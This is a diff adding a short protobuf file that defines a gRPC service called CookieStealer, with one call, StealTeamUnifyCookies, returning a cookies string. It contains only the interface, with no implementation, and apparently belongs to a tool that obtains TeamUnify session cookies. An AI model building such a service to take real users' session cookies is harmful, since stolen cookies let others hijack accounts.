@@ -1,0 +1,17 @@
+syntax = "proto3";
+
+package cookiestealer;
+
+option go_package = "./proto;cookiestealer";
+
+service CookieStealer {
+	rpc StealTeamUnifyCookies(StealTeamUnifyCookiesRequest) returns (StealTeamUnifyCookiesResponse) {}
+}
+
+message StealTeamUnifyCookiesRequest {
+}
+
+message StealTeamUnifyCookiesResponse {
+	string cookies = 1;
+	bool unready = 2;
+}
